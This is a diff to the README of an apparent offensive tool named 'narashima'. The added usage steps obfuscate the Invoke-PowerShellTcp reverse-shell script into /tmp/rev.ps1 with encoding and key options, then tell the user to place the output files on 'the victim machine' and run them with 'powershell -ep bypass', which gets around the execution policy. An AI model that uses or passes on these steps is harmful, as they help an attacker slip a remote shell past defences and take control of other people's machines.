@@ -25,9 +25,19 @@
 ## 🚀 Usage
 
 ```bash
+
+pip3 install -r requirements.txt (recommended above or equal to python 3.12.x)
+
 chmod +x narashima
 
 ./narashima -o /tmp/rev.ps1 -s -d -n -x -i -f -b --decimal -l 2 --random-backticks  --key "secret123" /shell/Invoke-PowerShellTcp.ps1
+```
+
+- Now the exe will give three files (file.ps1, god.txt, god-killer.txt)
+- Place all three files on the victim machine and run file.ps1
+
+```powershell
+powershell -ep bypass ./file.ps1
 ```
 
 ### 🧩 Available Options
